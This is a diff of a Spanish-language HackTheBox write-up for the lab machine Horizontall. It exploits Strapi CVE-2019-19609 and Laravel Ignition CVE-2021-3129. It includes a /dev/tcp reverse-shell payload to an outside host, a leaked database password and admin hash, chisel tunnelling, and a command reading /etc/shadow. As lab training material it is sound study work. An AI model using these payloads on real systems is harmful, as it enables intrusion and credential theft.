@@ -23,7 +23,7 @@ layout:
 
 ## Reconnaissance
 
-
+Realizaremos un reconocimiento con **nmap** para ver los puertos que están expuestos en la máquina **Horizontall**. Este resultado lo almacenaremos en un archivo llamado `allPorts`.
 
 ```bash
 ❯ nmap -p- --open -sS --min-rate 1000 -vvv -Pn -n 10.10.11.105 -oG allPorts
@@ -47,7 +47,7 @@ Nmap done: 1 IP address (1 host up) scanned in 12.06 seconds
            Raw packets sent: 65535 (2.884MB) | Rcvd: 65549 (2.623MB)
 ```
 
-
+A través de la herramienta de [`extractPorts`](https://pastebin.com/X6b56TQ8), la utilizaremos para extraer los puertos del archivo que nos generó el primer escaneo a través de `Nmap`. Esta herramienta nos copiará en la clipboard los puertos encontrados.
 
 ```bash
 ❯ extractPorts allPorts
@@ -60,7 +60,7 @@ Nmap done: 1 IP address (1 host up) scanned in 12.06 seconds
 [*] Ports copied to clipboard
 ```
 
-
+Lanzaremos scripts de reconocimiento sobre los puertos encontrados y lo exportaremos en formato oN y oX para posteriormente trabajar con ellos. En el resultado, comprobamos que se encuentran abierta una página web de `Nginx`.
 
 ```bash
 ❯ nmap -sCV -p22,80 10.10.11.105 -A -oN targeted -oX targetedXML
@@ -94,35 +94,40 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 11.40 seconds
 ```
 
-
+Transformaremos el archivo generado `targetedXML` para transformar el XML en un archivo HTML para posteriormente montar un servidor web y visualizarlo.
 
 ```bash
 ❯ xsltproc targetedXML > index.html
+
 ❯ python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
-
+Accederemos a[ http://localhost](http://localhost) y verificaremos el resultado en un formato más cómodo para su análisis.
 
 <figure><img src="../../.gitbook/assets/imagen (414).png" alt=""><figcaption></figcaption></figure>
 
-
+Añadiremos la siguiente entrada en nuestro archivo `/etc/hosts`.
 
 ```bash
 ❯ cat /etc/hosts | grep horizontall
 10.10.11.105 horizontall.htb
 ```
 
+## Web Enumeration
 
+Realizaremos una comprobación de las tecnologías que utiliza el sitio web.
 
 ```bash
 ❯ whatweb http://horizontall.htb
 http://horizontall.htb [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.14.0 (Ubuntu)], IP[10.10.11.105], Script, Title[horizontall], X-UA-Compatible[IE=edge], nginx[1.14.0]
 ```
 
+Accederemos a [http://horizontall.htb](http://horizontall.htb) y nos encontramos con la siguiente página web. Aparentemente, no obtenemos ningún dato interesante en el contenido principal de la página web.
+
 <figure><img src="../../.gitbook/assets/imagen (415).png" alt=""><figcaption></figcaption></figure>
 
-
+Realizaremos una enumeración de posibles subdominios de la página web, pero no logramos obtener resultado alguno.
 
 ```bash
 ❯ wfuzz --hh=194 -c --hc=404,400 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -H "Host: FUZZ.horizontall.htb" http://horizontall.htb 2>/dev/null
@@ -140,7 +145,7 @@ ID           Response   Lines    Word       Chars       Payload
 000000173:   200        1 L      43 W       901 Ch      "www" 
 ```
 
-
+A través de la herramienta de `feroxbuster`, realizaremos una enumeración de directorios y subdominios de la página web. En el resultado obtenido, se nos muestran solamente archivos de `JavaScript`.
 
 ```bash
 ❯ feroxbuster -u http://horizontall.htb/ -t 200 -C 500,502,404
@@ -177,7 +182,7 @@ by Ben "epi" Risher 🤓                 ver: 2.11.0
 
 
 
-
+Comprobaremos el contenido de estos archivos `JS` que tienen de nombre `app`, quizás podamos obtener algún dato interesante. Nos descargaremos el archivo a través de `cURL`.
 
 ```bash
 ❯ curl -s -X GET 'http://horizontall.htb/js/app.c68eb462.js' -o app.js
@@ -185,7 +190,9 @@ by Ben "epi" Risher 🤓                 ver: 2.11.0
 .rw-rw-r-- kali kali 18 KB Wed Feb 19 12:33:18 2025  app.js
 ```
 
+Revisaremos el contenido del archivo de `JS` mediante `js-beautify`para verlo en un formato cómodo de `JS`.
 
+En el contenido del archivo, se hace mención sobre un nuevo subdominio de la página web llamado `api-prod.horizontall.htb`.
 
 ```javascript
 ❯ js-beautify app.js
@@ -211,18 +218,18 @@ by Ben "epi" Risher 🤓                 ver: 2.11.0
 },
 ```
 
-
+Añadiremos esta nueva entrada en nuestro archivo `/etc/hosts`.
 
 ```bash
 ❯ cat /etc/hosts | grep horizontall
 10.10.11.105 horizontall.htb api-prod.horizontall.htb
 ```
 
-
+Accederemos a[ http://api-prod.horizontall.htb](http://api-prod.horizontall.htb) y comprobaremos el siguiente contenido.
 
 <figure><img src="../../.gitbook/assets/5165_vmware_mjtS9q1D8h.png" alt=""><figcaption></figcaption></figure>
 
-
+Enumeraremos posibles directorios y páginas webs de esta nuevo subdominio. En el resultado obtenido, comprobamos diferentes páginas y directorios, entre las cuales nos llama la atención las de `admin` y `users`.
 
 ```bash
 ❯ feroxbuster -u http://api-prod.horizontall.htb/ -t 200 -C 500,502,404
@@ -262,20 +269,34 @@ by Ben "epi" Risher 🤓                 ver: 2.11.0
 200      GET        1l        1w       90c http://api-prod.horizontall.htb/admin/Layout
 ```
 
+Accederemos a http://api-prod.horizontall.htb/admin y comprobaremos el siguiente contenido. Se trata de un CMS llamado `Strapi`.
 
+{% hint style="info" %}
+Strapi es un CMS de código abierto, moderno y flexible que proporciona una solución escalable y personalizable para la gestión de contenido. Está diseñado específicamente para desarrolladores y se basa en tecnologías como Node. js, React y GraphQL.
+{% endhint %}
 
 <figure><img src="../../.gitbook/assets/imagen (416).png" alt=""><figcaption></figcaption></figure>
 
+Probamos de autenticarnos con las posibles credenciales por defecto de `Strapi`, pero desafortunadamente no logramos obtener acceso.
 
+<figure><img src="../../.gitbook/assets/imagen (421).png" alt=""><figcaption></figcaption></figure>
 
-codigo fuente
+## Initial Access
+
+### Strapi CMS 3.0.0-beta.17.4 Exploitation - Remote Code Execution \[RCE] (CVE-202¡19-19609)
+
+Herramientas como `Wappalyzer` o `whatweb` no nos acababan mostrando la versión del `Strapi`. Por lo tanto, decidimos intentar comprobar la versión del `Strapi` a través del código fuente de la propia página web.
+
+En el código fuente de la página web, nos encontramos en diferentes secciones que mencionan `Strapi 3.0.0-beta.17.4`.
 
 ```bash
 ❯ curl -s -X GET 'http://api-prod.horizontall.htb/admin/main.da91597e.chunk.js' | grep strapi-plugin | head -n5
 module.exports = JSON.parse("{\"_from\":\"strapi-plugin-content-type-builder@3.0.0-beta.17.4\"
 ```
 
+Realizamos una búsqueda a través de `searchsploit` para verificar la posible existencia de vulnerabilidades conocidas para esta posible versión del CMS.
 
+Verificamos que se nos muestra una vulnerabilidad de `Remote Code Execution (RCE) (Unauthenticated)` para nuestra versión del CMS que dispone la aplicación web. Esta vulnerabilidad está reportada como `CVE-2019-19609`.
 
 ```bash
 ❯ searchsploit Strapi
@@ -290,17 +311,13 @@ Strapi CMS 3.0.0-beta.17.4 - Set Password (Unauthenticated) (Metasploit)        
 Shellcodes: No Results
 ```
 
-
-
 {% embed url="https://www.incibe.es/index.php/incibe-cert/alerta-temprana/vulnerabilidades/cve-2019-19609" %}
 
 {% hint style="danger" %}
-El framework Strapi versiones anteriores a 3.0.0-beta.17.8, es vulnerable a una Ejecución de Código Remota en los componentes del Plugin de Instalación y Desinstalación del panel de Administración, ya que no sanea el nombre del plugin y los atacantes pueden inyectar comandos de shell arbitrarios para ser ejecutados mediante la función execa.
+El framework Strapi versiones anteriores a 3.0.0-beta.17.8, es vulnerable a una Ejecución de Código Remota en los componentes del Plugin de Instalación y Desinstalación del panel de Administración, ya que no sanea el nombre del plugin y los atacantes pueden inyectar comandos de shell arbitrarios para ser ejecutados mediante la función exec.
 {% endhint %}
 
-
-
-
+Realizando una búsqueda por Internet, nos encontramos con el siguiente repositorio de GitHub que nos ofrece la explotación de la vulnerabilidad.
 
 {% embed url="https://github.com/glowbase/CVE-2019-19609" %}
 
@@ -315,14 +332,14 @@ Recibiendo objetos: 100% (18/18), 5.13 KiB | 5.13 MiB/s, listo.
 Resolviendo deltas: 100% (4/4), listo.
 ```
 
-
+Nos pondremos en escucha con `nc` para poder obtener la conexión de la Reverse Shell.
 
 ```bash
 ❯ nc -nlvp 443
 listening on [any] 443 ...
 ```
 
-
+A través del exploit que nos hemos descargado, realizaremos la explotación de la vulnerabilidad sobre la página de `Strapi` vulnerable, para que se nos proporcione una Reverse Shell hacía nuestro equipo.
 
 ```bash
 ❯ python3 exploit.py http://api-prod.horizontall.htb 10.10.16.3 443
@@ -334,7 +351,7 @@ listening on [any] 443 ...
 [+] Executing exploit
 ```
 
-
+Verificamos que finalmente logramos realizar la explotación y nos encontramos en el equipo víctima con el usuario `strapi`. También podemos verificar la flag **user.txt**.
 
 ```bash
 ❯ nc -nlvp 443
@@ -347,10 +364,10 @@ $ ls -l /home
 total 4
 drwxr-xr-x 8 developer developer 4096 Aug  2  2021 developer
 $ cat /home/developer/user.txt
-37f728736ed1e053d9e23928a793a5b6
+37f728736e***********************
 ```
 
-
+Al obtener la reverse shell, mejoramos la calidad de la shell con los siguientes pasos para obtener una TTY interactiva.
 
 ```bash
 $ script /dev/null -c bash
@@ -365,7 +382,67 @@ strapi@horizontall:~/myapi$ export SHELL=bash
 strapi@horizontall:~/myapi$ stty rows 46 columns 230
 ```
 
+## Privilege Escalation
 
+### Information Leakage
+
+Realizando una enumeración del directorio donde nos encontramos, verificamos de la existencia de un archivo `database.json`el cual contiene las credenciales de acceso a la base de datos `strapi` de `MySQL`.
+
+```bash
+strapi@horizontall:~/myapi/config/environments/development$ cat database.json 
+{
+  "defaultConnection": "default",
+  "connections": {
+    "default": {
+      "connector": "strapi-hook-bookshelf",
+      "settings": {
+        "client": "mysql",
+        "database": "strapi",
+        "host": "127.0.0.1",
+        "port": 3306,
+        "username": "developer",
+        "password": "#J!:F9Zt2u"
+      },
+      "options": {}
+    }
+  }
+}
+```
+
+Nos conectaremos a través de las credenciales obtenidas, verificaremos las tablas presentes de la base de datos `strapi`. Entre las tablas enumeradas, nos encontramos una tabla llamada `strapi_administrator`.
+
+```bash
+strapi@horizontall:~/myapi/config/environments/development$ mysql -h localhost -e "show tables;" -u developer -p strapi
+Enter password: 
++------------------------------+
+| Tables_in_strapi             |
++------------------------------+
+| core_store                   |
+| reviews                      |
+| strapi_administrator         |
+| upload_file                  |
+| upload_file_morph            |
+| users-permissions_permission |
+| users-permissions_role       |
+| users-permissions_user       |
++------------------------------+
+```
+
+Comprobaremos los datos de la table mencionada y nos encontramos con el hash del usuario `admin`. Intentamos crackear este hash obtenido, pero no logramos crackearlo.
+
+```bash
+strapi@horizontall:~/myapi/config/environments/development$ mysql -h localhost -e "SELECT * FROM strapi_administrator;" -u developer -p strapi
+Enter password: 
++----+----------+-----------------------+--------------------------------------------------------------+--------------------+---------+
+| id | username | email                 | password                                                     | resetPasswordToken | blocked |
++----+----------+-----------------------+--------------------------------------------------------------+--------------------+---------+
+|  3 | admin    | admin@horizontall.htb | $2a$10$E6rb7Yal9gAo/rMmf2dOiOmgFOfelmn9s4eI55vhfQ3LPsjrrpi2i | NULL               |    NULL |
++----+----------+-----------------------+--------------------------------------------------------------+--------------------+---------+
+```
+
+### Discover Internal Web Server (Chisel Port Forwarding)
+
+Revisaremos los puertos internos de la máquina, en el resultado obtenido nos encontramos diferentes puertos abiertos.
 
 ```bash
 strapi@horizontall:~/myapi$ netstat -ano | grep LISTEN
@@ -378,7 +455,7 @@ tcp6       0      0 :::80                   :::*                    LISTEN      
 tcp6       0      0 :::22                   :::*                    LISTEN      off (0.00/0/0)
 ```
 
-
+Realizamos una comprobación sobre los diferentes puertos encontrados. A través de `cURL` al realizar una comprobación del puerto `8000`, se nos muestra que es una página web con el título de `Laravel`.
 
 ```bash
 strapi@horizontall:~/myapi$ curl 127.0.0.1:8000
@@ -391,18 +468,17 @@ strapi@horizontall:~/myapi$ curl 127.0.0.1:8000
         <title>Laravel</title>
 ```
 
-
-
-
+Para comprobar la página web desde nuestro equipo, lo que realizaremos es un **Port Forwarding** para poder comprobar el puerto interno desde nuestro equipo local. Este práctica lo realizaremos a través de [`chisel`](https://github.com/jpillora/chisel) el cual compartiremos a través de un servidor web.
 
 ```bash
 ❯ ls -l chisel
 .rwxr-xr-x kali kali 8.9 MB Sun Feb 16 03:43:15 2025  chisel
+
 ❯ python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
-
+Desde el equipo comprometido, nos descargaremos el binario de `chisel` y le daremos los permisos de ejecución correspondientes.
 
 ```bash
 strapi@horizontall:/tmp$ wget 10.10.16.3/chisel; chmod +x chisel
@@ -417,7 +493,7 @@ chisel            100%[==========================>]   8.94M  8.63MB/s    in 1.0s
 2025-02-19 04:52:39 (8.63 MB/s) - ‘chisel’ saved [9371800/9371800]
 ```
 
-
+Desde nuestro equipo, configuraremos `chisel` como servidor.
 
 ```bash
 ❯ ./chisel server --reverse -p 1234
@@ -426,7 +502,7 @@ chisel            100%[==========================>]   8.94M  8.63MB/s    in 1.0s
 2025/02/19 12:59:49 server: Listening on http://0.0.0.0:1234
 ```
 
-
+Por otro lado, desde el equipo víctima, deberemos de configurar el `chisel`para que actúe como cliente de nuestro servidor y realice el **Port Forwarding** del puerto interno `8000` para que sea el puerto `8000` de nuestro equipo local.
 
 ```bash
 strapi@horizontall:/tmp$ ./chisel client 10.10.16.3:1234 R:8000:127.0.0.1:8000
@@ -434,11 +510,15 @@ strapi@horizontall:/tmp$ ./chisel client 10.10.16.3:1234 R:8000:127.0.0.1:8000
 2025/02/19 04:56:50 client: Connected (Latency 31.034143ms)
 ```
 
+Desde nuestro navegador accederemos a http://localhost.8000 y comprobaremos que efectivamente se trataba de la interfaz de `Laravel`.
 
+{% hint style="info" %}
+Laravel es un framework de PHP y es utilizado para desarrollar aplicaciones web. PHP es el lenguaje de programación más utilizado en mundo para desarrollar sitios web, aplicaciones web y los populares CMS, como WordPress o Joomla.
+{% endhint %}
 
 <figure><img src="../../.gitbook/assets/imagen (417).png" alt=""><figcaption></figcaption></figure>
 
-
+Realizaremos una comprobación de los posibles directorios que se puedan encontrar en la página web. En el resultado obtenido, comprobamos la existencia de `/profiles` pero nos devuelve un código de estado `500`.
 
 ```bash
 ❯ gobuster dir -u http://localhost:8000/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -b 503,404
@@ -459,19 +539,33 @@ Starting gobuster in directory enumeration mode
 /profiles             (Status: 500) [Size: 616202]
 ```
 
-
+Si accedemos a [http://localhost:8000/profiles ](http://localhost:8000/profiles)se nos muestra el siguiente mensaje de error, al parecer la aplicación no funciona correctamente en este punto. Exploraremos otras vías.
 
 <figure><img src="../../.gitbook/assets/imagen (420).png" alt=""><figcaption></figcaption></figure>
 
+### Laravel 8.4.2 debug mode - Remote Code Execution \[RCE] (CVE-2021-3129)
 
+En la página inicial de http://localhost:8000, nos encontrábamos la versión de `Laravel` la cual al parecer la aplicación web utilizaba `Laravel 8`.
 
-<figure><img src="../../.gitbook/assets/imagen (418).png" alt=""><figcaption></figcaption></figure>
+Por lo tanto, decidimos buscar si existía alguna vulnerabilidad conocida para esta versión en concreto. Nos encontramos con el siguiente resultado, en el cual al parecer en la versión 8.4.2debug modepodíamos intentar obtener un RCE.
 
+Desconocemos la versión exacta de `Laravel` pero vale la pena intentar comprobar si es vulnerable a esta vulnerabilidad reportada como `CVE-2021-3129`.
 
+<figure><img src="../../.gitbook/assets/imagen (418).png" alt="" width="563"><figcaption></figcaption></figure>
 
 {% embed url="https://www.ambionics.io/blog/laravel-debug-rce" %}
 
+{% embed url="https://www.incibe.es/incibe-cert/alerta-temprana/vulnerabilidades/cve-2021-3129" %}
 
+{% hint style="danger" %}
+Ignition versiones anteriores a 2.5.2, como es usado en Laravel y otros productos, permite a atacantes remotos no autenticados ejecutar código arbitrario debido a un uso no seguro de las funciones file\_get\_contents() y file\_put\_contents(). Esto es explotable en sitios que usan el modo de depuración con Laravel versiones anteriores a 8.4.2
+{% endhint %}
+
+
+
+Nos encontramos el repositorio de GitHub de `Ambionics` en el cual nos muestran el PoC de cómo aprovecharnos de esta vulnerabilidad y de qué consise.
+
+{% embed url="https://github.com/ambionics/laravel-exploits" %}
 
 ```bash
 ❯ git clone https://github.com/ambionics/laravel-exploits; cd laravel-exploits
@@ -483,15 +577,19 @@ remote: Total 9 (delta 0), reused 3 (delta 0), pack-reused 0 (from 0)
 Recibiendo objetos: 100% (9/9), listo.
 ```
 
+Realizaremos la explotación, crearemos un payload malicioso llamado `exploit.phar` que ejecute el comando `id`.
 
+Al realizar la explotación de la vulnerabilidad sobre el `Laravel` vulnerable, nos encontramos que hemos podido ejecutar comandos arbitrarios y el usuario que ejecuta estos comandos es el usuario `root`.
+
+Con lo cual, tenemos una gran vía potencial de ejecutar comandos como `sudo` y poder obtener acceso como `root` en el equipo.
+
+{% hint style="info" %}
+Deberemos de disponer instalado  [phpgcc](https://github.com/ambionics/phpggc). PHPGGC es una biblioteca de cargas útiles PHP unserialize() junto con una herramienta para generarlas, desde la línea de comandos o mediante programación.
+{% endhint %}
 
 ```bash
 ❯ php -d'phar.readonly=0' /opt/phpggc/phpggc --phar phar -o /tmp/exploit.phar --fast-destruct monolog/rce1 system id
-```
 
-
-
-```bash
 ❯ python3 laravel-ignition-rce.py http://localhost:8000 /tmp/exploit.phar
 + Log file: /home/developer/myproject/storage/logs/laravel.log
 + Logs cleared
@@ -503,14 +601,14 @@ uid=0(root) gid=0(root) groups=0(root)
 + Logs cleared
 ```
 
-
+Nos pondremos en escucha con `nc`para recibir la conexión remota.
 
 ```bash
 ❯ nc -nlvp 443
 listening on [any] 443 ...
 ```
 
-
+Crearemos un nuevo archivo `exploit.phar` que ejecute como comando una Reverse Shell. Ejecutaremos el exploit sobre el `Laravel` vulnerable.
 
 ```bash
 ❯ php -d'phar.readonly=0' /opt/phpggc/phpggc --phar phar -o /tmp/exploit.phar --fast-destruct monolog/rce1 system "/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.3/443 0>&1'"
@@ -520,7 +618,7 @@ listening on [any] 443 ...
 + Successfully converted to PHAR !
 ```
 
-
+Verificamos que finalmente logramos obtener acceso al sistema como usuario `root`y podemos visualziar la flag **root.txt**
 
 ```bash
 ❯ nc -nlvp 443
@@ -530,12 +628,10 @@ bash: cannot set terminal process group (4676): Inappropriate ioctl for device
 bash: no job control in this shell
 root@horizontall:/home/developer/myproject/public# cat /root/root.txt
 cat /root/root.txt
-2bdca81209a4ac4cea748c2bad0fa44d
+2bdca812*************************
 ```
 
-
-
-
+Por otro lado, también nos encontramos con un repositorio de GitHub que automatiza todo este procedimiento.
 
 {% embed url="https://github.com/knqyf263/CVE-2021-3129" %}
 
@@ -553,7 +649,14 @@ exploit.py                                                100%[=================
 2025-02-19 13:35:00 (48,0 MB/s) - «exploit.py» guardado [3976/3976]
 ```
 
+Lo único que deberemos de editar en el archivo `exploit.py` es el contenido de la URL vulnerable y el comando que queremos ejecutar en el sistema.
 
+Lanzamos el exploit y lo primero que realiza es comprobar si tenemos `phpgcc` instalado en el directorio actual, en caso de que no lo tuviéramos haría la descarga automáticamente. Una vez comprobado, nos ejecutará el comando realizado, en este caso la explotación ha sido exitosa y se muestra le ejecución del comando `cat /etc/shadow`, como el usuario que ejecuta estos comandos es `root`, podemos visualizar de este archivo privilegiado.
+
+```python
+def main():
+    Exploit("http://localhost:8000", "cat /etc/shadow")
+```
 
 ```bash
 ❯ python3 exploit.py
